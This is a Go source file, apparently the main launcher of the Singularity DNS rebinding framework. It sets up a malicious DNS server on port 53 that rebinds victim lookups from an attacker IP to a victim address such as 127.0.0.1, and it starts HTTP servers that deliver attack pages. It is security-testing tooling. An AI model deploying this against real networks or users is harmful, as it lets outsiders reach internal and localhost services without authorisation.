package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/nccgroup/singularity"

	"github.com/miekg/dns"
)

type arrayPortFlags []int

func (a *arrayPortFlags) String() string {
	return fmt.Sprintf("%T", a)
}

func (a *arrayPortFlags) Set(value string) error {
	i, err := strconv.Atoi(value)
	if err != nil {
		log.Fatal("Could not convert port number string to int")
	}
	*a = append(*a, i)
	return nil
}

// Parse command line arguments and capture these into a runtime structure
func initFromCmdLine() *singularity.AppConfig {
	var appConfig = singularity.AppConfig{}
	var myArrayPortFlags arrayPortFlags

	var dnsRebindingStrategy = flag.String("DNSRebindStrategy", "DNSRebindFromQueryFirstThenSecond",
		"Specify how to respond to DNS queries from a victim client:  \"DNSRebindFromQueryRoundRobin\", \"DNSRebindFromQueryFirstThenSecond\", \"DNSRebindFromQueryRandom\", DNSRebindFromFromQueryMultiA\"")
	var responseIPAddr = flag.String("ResponseIPAddr", "192.168.0.1",
		"Specify the attacker host IP address that will be rebound to the victim host address using strategy specified by flag \"-DNSRebingStrategy\"")
	var responseReboundIPAddr = flag.String("ResponseReboundIPAddr", "127.0.0.1",
		"Specify the victim host IP address that is rebound from the attacker host address")
	var responseReboundIPAddrtimeOut = flag.Int("responseReboundIPAddrtimeOut", 300,
		"Specify delay (s) for which we will keep responding with Rebound IP Address after last query. After delay, we will respond with  ResponseReboundIPAddr.")
	var dangerouslyAllowDynamicHTTPServers = flag.Bool("dangerouslyAllowDynamicHTTPServers", false, "DANGEROUS if the flag is set (to anything). Specify if any target can dynamically request Singularity to allocate an HTTP Server on a new port.")

	flag.Var(&myArrayPortFlags, "HTTPServerPort", "Specify the attacker HTTP Server port that will serve HTML/JavaScript files. Repeat this flag to listen on more than one HTTP port.")

	flag.Parse()
	flagset := make(map[string]bool)
	flag.Visit(func(f *flag.Flag) { flagset[f.Name] = true })

	appConfig.RebindingFn = singularity.DNSRebindFromQueryFirstThenSecond
	// if user changed "-DNSRebindStrategy" from default, parse parameter:
	if flagset["DNSRebindStrategy"] {
		switch *dnsRebindingStrategy {
		case "DNSRebindFromQueryRoundRobin":
			appConfig.RebindingFn = singularity.DNSRebindFromQueryRoundRobin
		case "DNSRebindFromQueryFirstThenSecond":
			appConfig.RebindingFn = singularity.DNSRebindFromQueryFirstThenSecond
		case "DNSRebindFromQueryRandom":
			appConfig.RebindingFn = singularity.DNSRebindFromQueryRandom
		case "DNSRebindFromFromQueryMultiA":
			appConfig.RebindingFn = singularity.DNSRebindFromFromQueryMultiA
		default:
			log.Fatal("No valid DNS rebinding strategy provided")
		}
	}
	appConfig.RebindingFnName = *dnsRebindingStrategy

	if !flagset["HTTPServerPort"] {
		myArrayPortFlags = arrayPortFlags{8080}
	}

	appConfig.ResponseIPAddr = *responseIPAddr
	appConfig.ResponseReboundIPAddr = *responseReboundIPAddr
	appConfig.ResponseReboundIPAddrtimeOut = *responseReboundIPAddrtimeOut
	appConfig.HTTPServerPorts = myArrayPortFlags
	appConfig.AllowDynamicHTTPServers = *dangerouslyAllowDynamicHTTPServers

	log.Printf("Using rebinding strategy \"%v\".\n", *dnsRebindingStrategy)

	return &appConfig
}

func main() {

	appConfig := initFromCmdLine()
	dcss := &singularity.DNSClientStateStore{Sessions: make(map[string]*singularity.DNSClientState),
		RebindingStrategy: appConfig.RebindingFnName}
	hss := &singularity.HTTPServerStore{DynamicServers: make([]*http.Server, 2),
		StaticServers: make([]*http.Server, 1),
		Errc:          make(chan singularity.HTTPServerError, 1),
		AllowDynamicHTTPServers: appConfig.AllowDynamicHTTPServers}

	// Attach DNS handler function
	dns.HandleFunc(".", singularity.MakeRebindDNSHandler(appConfig, dcss))

	// Start DNS server
	dnsServerPort := 53
	dnsServer := &dns.Server{Addr: ":" + strconv.Itoa(dnsServerPort), Net: "udp"}
	log.Printf("Starting DNS Server at %v\n", dnsServerPort)

	go func() {
		dnsServerErr := dnsServer.ListenAndServe()
		if dnsServerErr != nil {
			log.Fatalf("Failed to start DNS server: %s\n ", dnsServerErr.Error())
		}
	}()

	defer dnsServer.Shutdown()

	for _, port := range appConfig.HTTPServerPorts {
		// Start HTTP Servers
		httpServer := singularity.NewHTTPServer(port, hss, dcss)
		httpServerErr := singularity.StartHTTPServer(httpServer, hss, false)

		if httpServerErr != nil {
			log.Fatalf("Could not start main HTTP Server instance: %v", httpServerErr)
		}

	}
	expiryDuration := time.Duration(appConfig.ResponseReboundIPAddrtimeOut) * time.Second
	expireClientStateTicker := time.NewTicker(expiryDuration)

	for {
		select {
		case <-expireClientStateTicker.C:
			dcss.ExpireOldEntries(expiryDuration)
		case err := <-hss.Errc:
			log.Printf("HTTP server (%v): %v", err.Port, err.Err)
		}
	}

}
